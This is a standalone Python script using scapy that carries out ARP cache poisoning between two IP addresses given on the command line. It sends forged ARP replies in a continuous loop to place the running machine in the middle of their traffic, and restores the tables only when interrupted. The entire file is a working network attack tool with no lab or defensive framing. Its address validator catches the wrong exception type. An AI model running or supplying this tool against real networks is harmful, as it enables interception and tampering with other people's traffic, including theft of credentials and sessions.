#!/usr/bin/python3

import sys, argparse, socket, time
import scapy.all as scapy

def valid_ip4(address):
    try:
        socket.inet_pton(socket.AF_INET, address)
        return True
    except AttributeError:
        return False

def restore_arp_tables(dst, src):
    dst_mac = get_mac(dst)
    src_mac = get_mac(src)
    if dst_mac != False and src_mac != False:
        packet = scapy.ARP(op=2, pdst=dst, hwdst=dst_mac, psrc=src, hwsrc=src_mac)
        scapy.send(packet, verbose=False)
        return True
    return False

def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast/arp_req
    try:
        response = scapy.srp(packet, timeout=5, verbose=False)[0]
        return response[0][1].hwsrc
    except:
        print("Could not receive a proper response to the ARP packet.")
        return False

def spoof_arp(dst, src):
    mac = get_mac(dst)
    if mac != False:
        packet = scapy.ARP(op=2, hwdst=mac, pdst=dst, psrc=src)
        scapy.send(packet, verbose=False)
        return True
    return False

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--src", help="The source IP you want to spoof.", type=str, required=True)
    parser.add_argument("--dst", help="The target IP you want to spoof.", type=str, required=True)
    parser.add_argument("--sleep", help="Sleep intervals between each packet. Default is 0.", type=int, required=False)

    args = parser.parse_args()

    src = args.src
    dst = args.dst

    sleep = 0
    if args.sleep != None:
        sleep = args.sleep

    if not valid_ip4(src) or not valid_ip4(dst):
        print("Invalid IP address.")
        sys.exit(2)
    
    max_err = 1000
    print("Spoofing...")
    try:
        while True:
            if not spoof_arp(dst, src):
                max_err -= 1
            if not spoof_arp(src, dst):
                max_err -= 1
            if max_err <= 0:
                print("Maximum errors reached. Stopping...")
                break
            time.sleep(sleep)
    except KeyboardInterrupt:
        restore_arp_tables(dst, src)
        restore_arp_tables(src, dst)
        print("Interrupted")
        sys.exit(1)

if __name__ == "__main__":
    main()
